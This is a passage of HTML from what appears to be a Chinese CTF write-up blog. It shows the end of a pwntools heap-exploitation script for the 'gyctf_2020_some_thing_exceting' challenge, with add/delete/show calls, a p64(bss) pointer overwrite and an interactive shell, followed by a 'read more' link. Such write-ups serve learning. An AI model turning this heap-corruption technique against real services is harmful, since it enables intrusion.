class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(bss),<span class="number">0x50</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;MMMM&#x27;</span>,<span class="number">0x50</span>,<span class="string">&#x27;kkkk&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;1&#x27;</span>,<span class="number">0x60</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#dele(0)</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2023/10/16/gyctf_2020_some_thing_exceting/">展开全文 >></a>
     </p>
     
 
